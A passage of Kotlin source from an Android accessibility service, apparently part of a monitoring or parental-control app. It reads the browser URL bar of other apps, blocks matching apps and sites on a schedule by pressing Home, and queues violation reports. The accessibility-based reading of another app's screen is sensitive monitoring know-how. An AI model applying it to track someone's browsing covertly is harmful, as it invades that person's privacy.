                if (rule.isActiveNow(dayAbbrev, minutesOfDay)) {
                    blockForeground(rule, packageName)
                }
            }
    }

    private fun checkWebsiteRules() {
        val websiteRules = loadedRules().filter { it.ruleType == "website" }
        if (websiteRules.isEmpty()) return

        val urlBarText = findUrlBarText(rootInActiveWindow) ?: return
        val (dayAbbrev, minutesOfDay) = currentDayAndMinute()
        websiteRules.firstOrNull { rule ->
            rule.isActiveNow(dayAbbrev, minutesOfDay) && urlBarText.contains(rule.target, ignoreCase = true)
        }?.let { rule -> blockForeground(rule, urlBarText) }
    }

    private fun findUrlBarText(root: AccessibilityNodeInfo?): String? {
        if (root == null) return null
        for (resourceId in browserUrlBarIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(resourceId)
            val text = nodes?.firstOrNull()?.text?.toString()
            if (!text.isNullOrBlank()) return text
        }
        return null
    }

    private fun blockForeground(rule: BlockRule, matchedTarget: String) {
        // Debounce — one window-state event can fire multiple times in quick
        // succession; avoid spamming Home actions and duplicate violation reports.
        val now = System.currentTimeMillis()
        if (matchedTarget == lastBlockedPackage && now - lastBlockedAt < 2000) return
        lastBlockedPackage = matchedTarget
        lastBlockedAt = now

        // NOT startActivity(ACTION_MAIN/CATEGORY_HOME) — Android's background
        // activity launch restrictions (tightened further on MIUI) silently
        // swallow a Context.startActivity() call made from a Service with no
        // visible UI of its own, so detection fired (the alert below proves
        // it) but nothing visibly happened. performGlobalAction is the
        // accessibility-specific API for this exact case — it simulates the
        // physical Home button press directly through the accessibility
        // layer, not through the activity-launch path, so it isn't subject
        // to that restriction.
        performGlobalAction(GLOBAL_ACTION_HOME)

        BlockViolationWorker.enqueue(applicationContext, rule.id, matchedTarget)
    }

    private fun currentDayAndMinute(): Pair<String, Int> {
        val cal = Calendar.getInstance()
        val dayAbbrev = SimpleDateFormat("EEE", Locale.US).format(cal.time).lowercase()
        val minutesOfDay = cal.get(Calendar.HOUR_OF_DAY) * 60 + cal.get(Calendar.MINUTE)
        return dayAbbrev to minutesOfDay
    }

    override fun onInterrupt() {
        stopBrowserPolling()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.stop(applicationContext)
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        instance = null
        return super.onUnbind(intent)
    }
}
